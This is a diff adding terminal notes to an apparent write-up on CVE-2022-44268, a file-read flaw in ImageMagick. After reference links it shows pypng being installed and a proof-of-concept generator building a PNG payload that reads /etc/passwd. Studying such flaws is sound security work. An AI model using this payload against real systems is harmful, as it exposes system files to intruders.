@@ -44,3 +44,22 @@ https://www.metabaseq.com/imagemagick-zero-days/
 
 
 https://github.com/voidz0r/CVE-2022-44268
+
+└──╼ [★]$ sudo pip3 install pypng
+Collecting pypng
+  Downloading pypng-0.20220715.0-py3-none-any.whl (58 kB)
+     |████████████████████████████████| 58 kB 4.3 MB/s 
+Installing collected packages: pypng
+Successfully installed pypng-0.20220715.0
+
+
+
+└──╼ [★]$ sudo python3 generate.py -f "/etc/passwd" -o exploit1
+
+   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
+   [>] Generating Blank PNG
+   [>] Blank PNG generated
+   [>] Placing Payload to read /etc/passwd
+   [>] PoC PNG generated > exploit1
+
+
